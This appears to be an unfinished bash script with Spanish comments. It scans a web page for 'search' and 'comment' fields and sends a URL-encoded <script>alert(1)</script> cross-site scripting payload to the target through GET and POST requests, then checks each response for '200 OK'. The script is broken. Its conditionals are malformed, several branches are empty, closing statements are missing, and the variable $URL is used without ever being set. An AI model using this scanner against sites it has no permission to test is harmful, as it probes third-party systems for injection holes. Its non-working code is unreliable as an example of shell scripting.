

search=$(wget -q -O - "$1" | grep "search")
comment=$(wget -q -O - "$1" | grep "comment")
if  [[ curl $URL | grep 'method=\"GET\"' ]]
then
  #aqui ejecutamos xss con get, checkear si esta search
  if [[ $search ]]
  then
    XSS="%3Cscript%3Ealert%281%29%3C%2Fscript%3E"
    ATTACK="$URL$XSS"
    curl -i $ATTACK | grep "200 OK"
else
  if  [[ curl $URL | grep 'method=\"POST\"' ]]
  then
  #aqui ejecutamos xss con post, checkear si tambien esta comment
    if [[ $comment ]]
    then
    
    else
      if [[ $search ]]
      then
        curl -d "search=%3Cscript%3Ealert%281%29%3C%2Fscript%3E" $URL
    fi
  else
  # aqui ejecutamos los  dos, checkear si esta search o comment
    if [[ $comment ]]
    then
    
    else [[ $search ]]
      XSS="%3Cscript%3Ealert%281%29%3C%2Fscript%3E"
      ATTACK="$URL$XSS"
      curl -i $ATTACK | grep "200 OK"
      curl -d "search=%3Cscript%3Ealert%281%29%3C%2Fscript%3E" $URL
    fi
      
  fi
fi
